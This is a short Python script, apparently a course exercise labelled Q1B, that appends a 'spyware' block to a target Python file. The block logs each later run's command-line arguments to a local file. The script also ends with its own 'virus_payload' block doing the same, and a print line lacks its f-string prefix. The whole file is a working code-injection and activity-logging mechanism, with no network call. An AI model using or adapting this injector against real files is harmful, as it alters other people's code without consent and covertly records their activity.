import sys

def spyware_present(file_path):
    with open(file_path, 'r') as f:
        contents = f.read()
        return "spyware_payload" in contents
    
def append_payload(file_path):
    with open(file_path, 'a') as f:
        f.write('''
#spyware_payload
import sys
import os
                
with open('Q1B.out', 'a') as f:
    f.write(' '.join(sys.argv) + '\\n')
''')
        

def main():
    if len(sys.argv) != 2:
        print("Usage: python Q1B.py <script_name.py>")
        return
    
    script_name = sys.argv[1]

    if spyware_present(script_name):
        print("Spyware already present in script")
        return
    
    append_payload(script_name)
    print("Spyware added to {script_name}")

if __name__ == "__main__":
    main()

#virus_payload
import sys
import os
                
with open('Q1C.out', 'a') as f:
    f.write(' '.join(sys.argv) + '\n')


